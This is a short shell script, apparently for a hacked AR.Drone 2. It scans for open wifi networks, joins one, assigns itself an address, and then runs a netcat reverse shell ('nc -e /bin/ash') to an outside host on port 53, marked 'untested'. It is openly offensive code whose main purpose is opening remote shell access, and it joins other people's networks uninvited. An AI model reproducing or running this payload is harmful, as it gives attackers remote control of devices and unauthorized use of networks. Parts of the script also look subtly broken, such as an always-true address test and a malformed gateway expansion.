#!/bin/ash

# scan for wifi
killall udhcpd;ifconfig ath0 down;iwconfig ath0 mode managed; ifconfig ath0 up; iwlist ath0 scan &>/data/video/my.log
echo "[DEBUG] scaning done " > /data/video/debug.log

# get count of open wifis - maybe loop through open wifi if reverse shell fails
CNT=$(cat /data/video/my.log | grep -c "Encryption key:off")
echo "[DEBUG] cnt $CNT " >> /data/video/debug.log
echo "[DEBUG] found $CNT open networks"

# get target ESSID of first open wifi
ESSID=$(cat /data/video/my.log | grep -m1 -B5 "Encryption key:off" | grep ESSID | awk -F ":" '{print $2}')
#ESSID="Ardrone2_Test"
echo "[DEBUG] essid $ESSID" >> /data/video/debug.log
echo "[DEBUG] connecting to $ESSID"

# set known ip
MYIP="1.2.3.4"
ifconfig ath0 $MYIP netmask 255.255.0.0

# connect to open wifi
#iwconfig ath0 essid $ESSID
iwconfig ath0 essid odn

# debug
ifconfig -a ath0 >> /data/video/debug.log
iwconfig ath0 >> /data/video/debug.log

# get ip via dhcp - does not time out for whatever reason so arp fallback wont be reached
udhcpc -i ath0 -T 3 -t 5 >> /data/video/debug.log

# fallback over ARP
IP=$(ifconfig ath0 | grep inet | awk '{print $2}' | awk -F ':' '{print $2}')
echo "[DEBUG] IP $IP " >> /data/video/debug.log
if [ $IP=$MYIP ];
    then
        RND=$(tr -dc 0-9 < /dev/urandom | dd bs=1 count=3 2>/dev/null)
        # hope that IP is not already used
        OCTET=$(($RND % 253 + 1))
        TMP=$(arp -a | awk '{print $2}' | tr -d '()' | awk -F '.' '{print $1"."$2"."$3"."}')\
        ifconfig ath0 $TMP$OCTET netmask 255.255.0.0
        # a lucky guess
        route add 0.0.0.0 netmask 0.0.0.0 gw $(TMP)1
fi

# log ifconfig details
ifconfig -a ath0 >> /data/video/debug.log

# execute reverse shell (untested)
chmod +x /data/video/nc
/data/video/nc -w 5 -e /bin/ash msf.niph.de 53

# restore wifi
/bin/wifi_setup.sh
